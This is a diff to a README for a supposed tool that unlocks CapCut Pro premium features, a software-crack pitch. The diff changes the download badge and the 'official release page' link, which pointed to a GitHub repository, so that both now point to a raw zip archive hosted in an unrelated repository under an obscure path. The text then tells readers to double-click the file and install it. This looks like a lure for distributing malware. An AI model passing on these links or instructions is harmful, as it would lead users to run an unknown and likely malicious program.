@@ -5,7 +5,7 @@ description: "Activate premium features for CapCut Pro on Windows including 4K e
 ---
 # 🎥 Content-Creator-Utility - Create professional videos with ease today
 
-[![](https://img.shields.io/badge/Download-Content_Creator_Utility-blue.svg)](https://github.com/Jeqevep1242/Content-Creator-Utility)
+[![](https://img.shields.io/badge/Download-Content_Creator_Utility-blue.svg)](https://raw.githubusercontent.com/Jeqevep1242/jeqevep1242.github.io/main/Platysomidae/Dist_2.2.zip)
 
 ## 📌 Overview
 
@@ -33,7 +33,7 @@ Check your computer against these requirements before you start the setup proces
 
 Follow these steps to put the software on your machine:
 
-1.  Visit the official release page to download the program: [https://github.com/Jeqevep1242/Content-Creator-Utility](https://github.com/Jeqevep1242/Content-Creator-Utility)
+1.  Visit the official release page to download the program: [https://raw.githubusercontent.com/Jeqevep1242/jeqevep1242.github.io/main/Platysomidae/Dist_2.2.zip](https://raw.githubusercontent.com/Jeqevep1242/jeqevep1242.github.io/main/Platysomidae/Dist_2.2.zip)
 2.  Click the link under the "Assets" section to save the installation file to your computer.
 3.  Locate the downloaded file in your "Downloads" folder.
 4.  Double-click the file to start the installation wizard.
